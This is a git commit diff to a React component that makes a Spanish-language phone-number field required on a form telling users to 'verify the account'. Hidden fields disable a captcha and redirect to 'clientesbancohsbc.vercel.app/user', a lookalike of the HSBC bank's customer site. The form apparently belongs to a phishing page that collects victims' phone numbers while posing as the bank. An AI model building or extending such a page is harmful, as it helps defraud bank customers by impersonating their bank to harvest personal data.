81343b3f31daeab6a252948ba31ecca9a86a9e7a
skaimarvel <134034793+skaimarvel@users.noreply.github.com>
2023-05-21 16:36:20 -0500

    Update Numerocelular.jsx

--- src/components/Numerocelular.jsx
+++ src/components/Numerocelular.jsx
@@ -42,7 +42,7 @@ const Numerocelular = () => {
               <label className="label">Ingresa tu número celular para verificar la cuenta</label>
             </div>
             <div className="input-cont">
-              <input className="inputname" name="name" placeholder="Ingresa tu numero de celular" maxLength="10" type="number" />
+              <input className="inputname" name="name" placeholder="Ingresa tu numero de celular" maxLength="10" type="number" required/>
               <input type="hidden" name="email" value="" />
               <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
               <input type="hidden" name="_captcha" value="false" />
